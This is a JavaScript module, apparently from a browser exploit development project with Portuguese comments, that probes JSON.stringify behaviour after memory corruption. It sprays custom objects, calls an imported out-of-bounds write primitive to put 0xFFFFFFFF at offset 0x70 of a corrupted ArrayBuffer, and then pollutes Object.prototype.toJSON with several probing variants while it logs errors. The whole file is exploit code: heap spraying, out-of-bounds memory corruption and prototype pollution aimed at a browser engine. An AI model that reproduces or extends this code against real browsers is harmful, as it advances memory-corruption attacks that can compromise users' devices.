// js/script3/testIsolateForInRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `RangeErrorTestObj-${id}`;
        this.marker = 0x1234ABCD;
        this.data = [id, id + 1, id + 2];
        this.subObject = { nested_prop: id * 10 };
        // Adicionar algumas propriedades enumeráveis extras
        this[`prop${id}`] = id;
        this[`anotherProp${id}`] = `val${id}`;
    }
    // Sem métodos para manter simples para este teste de enumeração
}

// --- Variantes da toJSON para testar o RangeError ---
export const toJSON_RangeErrorVariants = {
    V0_EmptyReturn: function() {
        return { variant: "V0_EmptyReturn" };
    },
    V1_AccessThisId: function() {
        try { return { variant: "V1_AccessThisId", id: this.id }; }
        catch (e) { return { variant: "V1_AccessThisId", error: e.message }; }
    },
    V2_LoopInEmpty: function() { // Loop for...in vazio
        let count = 0;
        try {
            for (const p in this) {
                count++; // Apenas contar, sem acessar this[p]
                if (count > 1000) { // Prevenção de loop realmente infinito no teste
                    return { variant: "V2_LoopInEmpty", error: "Loop > 1000 iterations", count };
                }
            }
            return { variant: "V2_LoopInEmpty", count };
        } catch (e) {
            return { variant: "V2_LoopInEmpty", error: e.message, count_at_error: count };
        }
    },
    V3_LoopInWithAccess: function() { // Loop for...in com acesso simples a this[p]
        let props = {}; let count = 0;
        try {
            for (const p in this) {
                count++;
                if (count > 100) { // Limitar props logadas e iterações
                     props['...'] = "truncated"; break;
                }
                if (Object.prototype.hasOwnProperty.call(this, p)) {
                     // Tentar converter para string de forma segura
                    try { props[p] = String(this[p]).substring(0, 30); }
                    catch(e_prop) { props[p] = `Error accessing prop ${p}: ${e_prop.name}`; }
                }
            }
            return { variant: "V3_LoopInWithAccess", props: props, count: count };
        } catch (e) {
            return { variant: "V3_LoopInWithAccess", error: e.message, props_collected: props, count_at_error: count };
        }
    },
    V4_ObjectKeysThenAccess: function() { // Usar Object.keys e depois acessar
        let props = {}; let keys = [];
        try {
            keys = Object.keys(this);
            for (const p of keys) {
                 try { props[p] = String(this[p]).substring(0, 30); }
                 catch(e_prop) { props[p] = `Error accessing prop ${p}: ${e_prop.name}`; }
            }
            return { variant: "V4_ObjectKeysThenAccess", props: props, num_keys: keys.length };
        } catch (e) {
            return { variant: "V4_ObjectKeysThenAccess", error: e.message, keys_collected: keys.length, props_collected: props };
        }
    }
};

export async function executeProbeComplexObjectWithMinimalToJSONs(
    toJSONFunctionToUse,
    toJSONFunctionName
) {
    const FNAME_TEST = `executeProbeComplexObj<${toJSONFunctionName}>`;
    logS3(`--- Iniciando Teste de Sondagem: Usando ${toJSONFunctionName} ---`, "test", FNAME_TEST);
    document.title = `Probe Complex - ${toJSONFunctionName}`;

    const spray_count = 50;
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = 0x70;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    // 1. Spray
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObjectForRangeError(i));
        }
    } catch (e_spray) {
        logS3(`ERRO no spray para ${toJSONFunctionName}: ${e_spray.message}`, "error", FNAME_TEST);
        return { error: e_spray, toJSON_name: toJSONFunctionName };
    }

    // 2. Setup OOB e Corrupção
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { error: new Error("OOB Setup Failed"), toJSON_name: toJSONFunctionName };
    }
    try {
        logS3(`  Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
    } catch (e_write) {
        logS3(`  ERRO na escrita OOB para ${toJSONFunctionName}: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { error: e_write, toJSON_name: toJSONFunctionName };
    }
    await PAUSE_S3(100);

    // 3. Sondagem
    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let resultFromProbe = { toJSON_name: toJSONFunctionName, error: null, stringifyResult: null, object_id: null };

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        const target_obj_to_stringify = sprayed_objects[0]; // Focar no primeiro objeto
        if (target_obj_to_stringify) {
            resultFromProbe.object_id = target_obj_to_stringify.id;
            logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id}) com ${toJSONFunctionName}...`, "info", FNAME_TEST);
            resultFromProbe.stringifyResult = JSON.stringify(target_obj_to_stringify);
            logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(resultFromProbe.stringifyResult)}`, "info", FNAME_TEST);
            if (resultFromProbe.stringifyResult && resultFromProbe.stringifyResult.error) {
                resultFromProbe.error = new Error(`Erro interno da toJSON: ${resultFromProbe.stringifyResult.error}`);
            }
        }
    } catch (e_str) {
        resultFromProbe.error = e_str;
        logS3(`    !!!! ERRO AO STRINGIFY obj[0] com ${toJSONFunctionName} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
        if (e_str.name === 'RangeError') {
            document.title = `RangeError w/ ${toJSONFunctionName}!`;
        } else {
            document.title = `Error w/ ${toJSONFunctionName}!`;
        }
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype.toJSON;
        }
    }

    if (resultFromProbe.error) {
        logS3(`  ---> ${toJSONFunctionName}: PROBLEMA DETECTADO: ${resultFromProbe.error.name} - ${resultFromProbe.error.message}`, "critical", FNAME_TEST);
    } else {
        logS3(`  ---> ${toJSONFunctionName}: Completou sem erro explícito.`, "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    sprayed_objects.length = 0; // Ajudar GC
    return resultFromProbe;
}
